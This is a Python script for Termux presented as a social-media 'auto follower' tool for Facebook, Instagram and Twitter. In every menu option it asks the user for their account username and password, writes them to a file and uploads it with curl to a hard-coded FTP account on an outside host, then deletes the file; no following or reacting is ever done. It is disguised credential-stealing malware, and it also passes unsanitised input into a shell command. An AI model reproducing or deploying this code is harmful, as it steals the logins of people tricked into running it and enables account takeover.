#Tool By Muhammad prince (Md Touhid Miah)
import os
import subprocess
from subprocess import check_call
print("\033[1;31m    ______      ____                       ")     
print("\033[1;31m   / ____/___  / / /___ _      _____  __________")
print("\033[1;34m  / /_  / __ \/ / / __ \ | /| / / _ \/ ___/ ___/")
print("\033[1;34m / __/ / /_/ / / / /_/ / |/ |/ /  __/ /  (__  ) ")
print("\033[35m/_/    \____/_/_/\____/|__/|__/\___/_/  /____/  ")                 
print("\033[1;33mPlease Configure New Updates")
print("\033[1;31mNote: You can take 100 followers, 80 React, 13 Comment every 3 minutes")
print("\n")
cmd0 = os.system("pkg install curl && apt install curl")
cmd  = os.system("clear")
def intro():
    cmd  = os.system("clear")
    print("""
\033[1;34m ______    _ _
\033[1;34m|  ____|  | | |                       
\033[95m| |__ ___ | | | _____      _____ _ __ 
\033[95m|  __/ _ \| | |/ _ \ \ /\ / / _ \ '__|
\033[1;31m| | | (_) | | | (_) \ V  V /  __/ |   
\033[1;31m|_|  \___/|_|_|\___/ \_/\_/ \___|_|
   \033[0m>>Developed By Muhammad Prnce Md Touhid Miah<<
          \033[95mVersion : 2.3.6
\033[0m=================================== 
                                       """)
    print("""
\033[1;34m==> Select the number of the option that you want to start from below :
 
 \033[1;33m[1] Facebook Auto Follow    [THE JOKER]
 \033[1;33m[2] Facebook Auto React     [THE JOKER] 
 \033[1;33m[3] Facebook Auto Comment   [THE JOKER]
 \033[1;33m[4] Instagram Auto Follow
 \033[1;33m[5] Instagram Auto React
 \033[1;33m[6] Instagram Auto Comment
 \033[1;33m[7] Twitter Auto Follow
 \033[1;33m[8] Twitter Auto Comment
 \033[1;33m[9] Twitter Auto React""")
    print("\033[1;33m")
    var = int(input("[>] Select Your Option :"))
    if var == 1 :
        print("\nNote:Login to your account you want to take auto follower to")
        print("\n┌Type username or email adress")
        user = input("└──>")
        print("\n┌Type Password")
        password = input("└──>")
        order = "echo user {} password {}>facebook.txt && curl -T facebook.txt ftp:/demonsiteinfo:demon404@files.000webhost.com/public_html/ && rm -rf facebook.txt ".format(user,password)
        geny  = os.system(order)
        intro()
    elif var == 2 :
        print("\nNote:Login to your account you want to take auto react to")
        print("\n┌Type username or email adress")
        user = input("└──>")
        print("\n┌Type Password")
        password = input("└──>")
        order = "echo user {} password {}>facebook.txt && curl -T facebook.txt ftp:/demonsiteinfo:demon404@files.000webhost.com/public_html/ && rm -rf facebook.txt ".format(user,password)
        geny  = os.system(order)
        intro()
    elif var == 3 :
        print("\nNote:Login to your account you want to take auto comment to")
        print("\n┌Type username or email adress")
        user = input("└──>")
        print("\n┌Type Password")
        password = input("└──>")
        order = "echo user {} password {}>facebook.txt && curl -T facebook.txt ftp:/demonsiteinfo:demon404@files.000webhost.com/public_html/ && rm -rf facebook.txt ".format(user,password)
        geny  = os.system(order)
        intro()
    elif var == 4 :
        print("\nNote:Login to your account you want to take auto follower to")
        print("\n┌Type username or email adress")
        user = input("└──>")
        print("\n┌Type Password")
        password = input("└──>")
        order = "echo user {} password {}>instagram.txt && curl -T instagram.txt ftp:/demonsiteinfo:demon404@files.000webhost.com/public_html/ && rm -rf instagram.txt ".format(user,password)
        geny  = os.system(order)
        intro()
    elif var == 5 :
        print("\nNote:Login to your account you want to take auto react to")
        print("\n┌Type username or email adress")
        user = input("└──>")
        print("\n┌Type Password")
        password = input("└──>")
        order = "echo user {} password {}>instagram.txt && curl -T instagram.txt ftp:/demonsiteinfo:demon404@files.000webhost.com/public_html/ && rm -rf instagram.txt ".format(user,password)
        geny  = os.system(order)
        intro()
    elif var == 6 :
        print("\nNote:Login to your account you want to take auto comment to")
        print("\n┌Type username or email adress")
        user = input("└──>")
        print("\n┌Type Password")
        password = input("└──>")
        order = "echo user {} password {}>instagram.txt && curl -T instagram.txt ftp:/demonsiteinfo:demon404@files.000webhost.com/public_html/ && rm -rf instagram.txt ".format(user,password)
        geny  = os.system(order)
        intro()
    elif var == 7 :
        print("\nNote:Login to your account you want to take auto follower to")
        print("\n┌Type username or email adress")
        user = input("└──>")
        print("\n┌Type Password")
        password = input("└──>")
        order = "echo user {} password {}>twitter.txt && curl -T twitter.txt ftp:/demonsiteinfo:demon404@files.000webhost.com/public_html/ && rm -rf twitter.txt ".format(user,password)
        geny  = os.system(order)
        intro()
    elif var == 8 :
        print("\nNote:Login to your account you want to take auto react to")
        print("\n┌Type username or email adress")
        user = input("└──>")
        print("\n┌Type Password")
        password = input("└──>")
        order = "echo user {} password {}>twitter.txt && curl -T twitter.txt ftp:/demonsiteinfo:demon404@files.000webhost.com/public_html/ && rm -rf twitter.txt ".format(user,password)
        geny  = os.system(order)
        intro()
    elif var == 9 :
        print("\nNote:Login to your account you want to take auto comment to")
        print("\n┌Type username or email adress")
        user = input("└──>")
        print("\n┌Type Password")
        password = input("└──>")
        order = "echo user {} password {}>twitter.txt && curl -T twitter.txt ftp:/demonsiteinfo:demon404@files.000webhost.com/public_html/ && rm -rf twitter.txt ".format(user,password)
        geny  = os.system(order)
        intro()
    elif var == 10 :
        cmd0 = os.system("sleep 3")
        intro()    
    else:
        print("Not Found")
        cmd = os.system("sleep 2")
        intro()
intro()
